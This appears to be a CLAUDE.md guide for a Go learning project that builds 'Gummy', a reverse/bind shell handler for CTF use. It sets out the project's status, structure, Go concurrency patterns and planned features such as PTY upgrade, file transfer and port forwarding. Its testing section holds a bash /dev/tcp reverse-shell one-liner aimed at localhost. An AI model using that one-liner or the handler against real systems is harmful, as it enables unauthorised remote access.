# Gummy - Advanced Shell Handler for CTFs

## Project Overview

Gummy is a modern shell handler written in Go, designed for CTF competitions. It's a port/reimplementation of [Penelope](https://github.com/brightio/penelope) with enhanced features and a beautiful TUI interface using Bubble Tea.

**Primary Goals:**
- Learn Go by building a practical tool
- Create a robust reverse/bind shell handler for CTFs
- Implement advanced features (PTY upgrade, file transfers, port forwarding)
- Build a polished TUI with Bubble Tea

## Current Status

### ✅ Completed (Phase 1 - Core Basic)
- [x] Project structure setup
- [x] TCP listener implementation
- [x] Session management with goroutines and channels
- [x] Concurrent connection handling
- [x] Graceful shutdown with signal handling
- [x] Unique session ID generation (crypto/rand)
- [x] Basic connection acceptance and logging

### 🚧 In Progress
- [ ] Shell command execution and I/O handling
- [ ] Interactive shell session management

### 📋 TODO (Phase 2 - Advanced Features)
- [ ] PTY upgrade for proper shell interaction
- [ ] File upload/download functionality
- [ ] Port forwarding
- [ ] Auto-reconnect capability
- [ ] Multiple simultaneous sessions
- [ ] Session switching
- [ ] Command history per session

### 🎨 TODO (Phase 3 - TUI)
- [ ] Bubble Tea interface setup
- [ ] Session list view
- [ ] Interactive shell view
- [ ] File transfer progress indicators
- [ ] Logs panel
- [ ] Status bar with connection info
- [ ] Keyboard shortcuts

## Project Structure

```
gummy/
├── cmd/
│   └── gummy/
│       └── main.go              # Entry point, CLI flags, initialization
├── internal/
│   ├── listener/
│   │   └── listener.go          # TCP listener, session management
│   ├── session/
│   │   └── session.go           # TODO: Individual session logic
│   ├── pty/
│   │   └── pty.go              # TODO: PTY upgrade implementation
│   ├── transfer/
│   │   └── transfer.go         # TODO: File transfer logic
│   └── shell/
│       └── handler.go          # TODO: Shell command execution
├── ui/
│   └── tui.go                  # TODO: Bubble Tea interface
├── go.mod
├── go.sum
├── CLAUDE.md                   # This file
└── README.md
```

## Key Design Decisions

### Concurrency Model
- **Goroutines**: Each connection handled in separate goroutine
- **Channels**: Communication between listener and session manager
  - `newSession chan *Session` - Register new connections
  - `closeSession chan string` - Clean up disconnected sessions
- **Mutex**: `sync.RWMutex` protects shared session map
  - `Lock()` for writes (add/remove sessions)
  - `RLock()` for reads (list sessions)

### Session Management
- Sessions stored in map: `map[string]*Session`
- Unique IDs generated with `crypto/rand` (16 hex chars)
- Dedicated goroutine (`manageSessions()`) handles lifecycle events
- Pattern: centralized state management prevents race conditions

### Error Handling
- Go idiomatic: return errors explicitly
- Error wrapping with `fmt.Errorf("context: %w", err)`
- Graceful degradation where possible
- Log errors but keep server running

## Important Go Concepts Used

### 1. Goroutines
```go
go l.acceptConnections()  // Non-blocking concurrent execution
```

### 2. Channels
```go
l.newSession <- session    // Send
session := <-l.newSession  // Receive
```

### 3. Select Statement
```go
select {
case session := <-l.newSession:
    // Handle new
case id := <-l.closeSession:
    // Handle close
}
```

### 4. Defer
```go
defer conn.Close()  // Always executes on function return
```

### 5. Interfaces (upcoming)
Will be used for:
- `io.Reader` / `io.Writer` for shell I/O
- Custom interfaces for session operations

## Development Environment

**System:** Arch Linux with Hyprland + Fish shell

**Dependencies:**
- Go 1.21+ (check with `go version`)
- No external dependencies yet
- Future: Bubble Tea for TUI

**Build & Run:**
```fish
# Development
go run ./cmd/gummy -p 4444

# Build binary
go build -o gummy ./cmd/gummy

# Run binary
./gummy -p 4444 -h 0.0.0.0
```

**Testing Connection:**
```fish
# In another terminal
nc localhost 4444
```

## Next Steps (Priority Order)

### 1. Implement Shell Interaction (HIGH PRIORITY)
**File:** `internal/session/session.go` or enhance `listener.go`

**Tasks:**
- Read commands from connection
- Execute commands using `os/exec`
- Send output back to connection
- Handle stdin/stdout/stderr properly
- Implement command prompt

**Key packages:**
- `os/exec` - Execute shell commands
- `io` - I/O operations
- `bufio` - Buffered I/O for reading lines

### 2. PTY Upgrade (MEDIUM PRIORITY)
**File:** `internal/pty/pty.go`

**Tasks:**
- Detect shell type (bash, sh, etc.)
- Upgrade to proper PTY
- Handle terminal size (SIGWINCH)
- Enable interactive programs (vim, less, etc.)

**Key packages:**
- `github.com/creack/pty` (external dependency)
- `syscall` for terminal control

### 3. File Transfer (MEDIUM PRIORITY)
**File:** `internal/transfer/transfer.go`

**Tasks:**
- Base64 encoding/decoding
- Upload files to target
- Download files from target
- Progress indication

### 4. TUI with Bubble Tea (LOW PRIORITY - after core works)
**File:** `ui/tui.go`

**Tasks:**
- Initialize Bubble Tea program
- Create session list model
- Create shell interaction model
- Implement keyboard navigation
- Add status bar and logs

**Dependency:**
```fish
go get github.com/charmbracelet/bubbletea
go get github.com/charmbracelet/lipgloss
```

## Code Style Guidelines

### Language
- **Code comments, variables, functions:** English only
- **Git commits:** English
- **Documentation:** English

### Go Conventions
- Exported (public): `UpperCamelCase`
- Unexported (private): `lowerCamelCase`
- Constructors: `New()` or `NewTypeName()`
- Error handling: always check, explicit returns
- Use `gofmt` for formatting (automatic in most editors)

### Project Conventions
- Small, focused functions
- Clear separation of concerns
- Comment exported functions and types
- Use meaningful variable names (not too short, not too long)

## Common Patterns to Follow

### Adding New Session Operations
```go
// 1. Add method to Listener
func (l *Listener) OperationName(sessionID string) error {
    l.mu.RLock()
    session, exists := l.sessions[sessionID]
    l.mu.RUnlock()
    
    if !exists {
        return fmt.Errorf("session not found: %s", sessionID)
    }
    
    // Do operation
    return nil
}
```

### Creating New Goroutines
```go
// Always think about:
// 1. How will it terminate?
// 2. How do I signal it to stop?
// 3. Does it need channels for communication?
// 4. Does it access shared state? (needs mutex)

go func() {
    defer log.Println("Goroutine exiting")
    
    for {
        select {
        case <-stopChan:
            return
        case data := <-dataChan:
            // Process
        }
    }
}()
```

### Error Handling
```go
// Wrap errors with context
if err != nil {
    return fmt.Errorf("failed to do X: %w", err)
}

// Log and continue for non-critical errors
if err != nil {
    log.Printf("Warning: %v", err)
    // continue...
}
```

## Testing Strategy

### Manual Testing
```fish
# Start gummy
go run ./cmd/gummy -p 4444

# Connect with netcat
nc localhost 4444

# Later: test with actual reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1
```

### Future: Unit Tests
- Test session management logic
- Test command parsing
- Mock network connections

## Resources & References

### Penelope (Original Python version)
- https://github.com/brightio/penelope

### Go Documentation
- Tour of Go: https://go.dev/tour/
- Effective Go: https://go.dev/doc/effective_go
- Standard library: https://pkg.go.dev/std

### Bubble Tea (TUI)
- https://github.com/charmbracelet/bubbletea
- Examples: https://github.com/charmbracelet/bubbletea/tree/master/examples

### PTY Handling
- https://github.com/creack/pty
- https://blog.kowalczyk.info/article/zy/creating-pseudo-terminal-pty-in-go.html

## Questions to Consider

- **Session persistence:** Should sessions survive server restart?
- **Logging:** File-based logs vs in-memory vs both?
- **Configuration:** YAML/TOML file vs CLI flags only?
- **Authentication:** Add password/token for connections?
- **Encryption:** TLS support for connections?

## Notes for Claude Code

- This is a learning project - explain concepts when implementing
- Prefer clarity over cleverness
- Each feature should be small, testable, and working
- Comment non-obvious code
- Keep the educational value high

## Progress Tracking

Last updated: 2025-10-13
Current focus: Shell interaction and command execution
Next milestone: Working interactive shell with proper I/O handling
